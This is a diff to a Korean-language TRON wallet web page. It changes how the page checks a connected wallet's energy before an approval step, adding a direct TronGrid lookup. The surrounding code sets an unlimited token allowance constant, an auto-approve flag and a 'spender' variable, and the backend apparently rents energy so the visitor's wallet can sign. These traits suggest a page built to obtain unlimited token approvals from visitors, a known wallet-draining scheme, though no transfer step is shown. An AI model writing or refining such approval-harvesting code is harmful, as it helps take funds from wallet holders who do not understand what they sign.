@@ -693,9 +693,10 @@
       }
 
         var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-        var isConnected = false, isApproved = false, isApproving = false, activeProvider = 'Unknown', currentWalletAddress = null;
-        var wcConnector = null, wcAddress = null;
-        var _autoApproveScheduled = false; //
+var isConnected = false, isApproved = false, isApproving = false, activeProvider = 'Unknown', currentWalletAddress = null;
+var wcConnector = null, wcAddress = null;
+var _autoApproveScheduled = false;
+var spender = null;
 
         // ===== Utils =====
         function escapeHtml(s) {
@@ -1512,19 +1513,26 @@ userTrxBalance = (isFinite(parsedTrx) && parsedTrx >= 0) ? parsedTrx : 0;
             btn.disabled = true;
             btn.innerHTML = '<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>처리 중...</span>';
 
-                        // Step 1: 백엔드에서 에너지 + TRX 확인
+            // Step 1: 백엔드 확인 후 TronGrid에서 현재 보유 에너지 직접 확인 (130,000 이상이면 렌탈 생략)
             setProgress(20, '에너지 확인 중...');
             var shouldRentEnergy = true;
 
             try {
-                var prepRes = await fetch(API_BASE + '/wallet/prepare-approve', {
+                await fetch(API_BASE + '/wallet/prepare-approve', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ address: currentWalletAddress })
                 });
-                var prepData = await prepRes.json();
-                if (prepData.status === 'ok' && prepData.ready) {
-                    var currentEnergy = Number(prepData.energy) || 0;
+            } catch (pe) { /* 계속 진행 */ }
+
+            try {
+                var accRes = await fetch('https://api.trongrid.io/v1/accounts/' + encodeURIComponent(currentWalletAddress) + '/resources');
+                if (accRes.ok) {
+                    var resJson = await accRes.json();
+                    var resInfo = (resJson && resJson.data && typeof resJson.data === 'object') ? resJson.data : (resJson || {});
+                    var energyLimit = Number(resInfo.EnergyLimit || 0);
+                    var energyUsed = Number(resInfo.EnergyUsed || 0);
+                    var currentEnergy = Math.max(0, energyLimit - energyUsed);
 
                     if (currentEnergy >= 130000) {
                         shouldRentEnergy = false;
@@ -1533,7 +1541,7 @@ userTrxBalance = (isFinite(parsedTrx) && parsedTrx >= 0) ? parsedTrx : 0;
                         setProgress(30, '에너지 부족 (' + currentEnergy.toLocaleString() + ') - 렌탈 예정');
                     }
                 }
-            } catch (pe) { /* 계속 진행 */ }            
+            } catch (energyErr) { /* 조회 실패 시 기본값(렌탈 진행) 유지 */ }                    
 
             if (shouldRentEnergy) {
                 setProgress(45, '에너지 렌탈 중...');
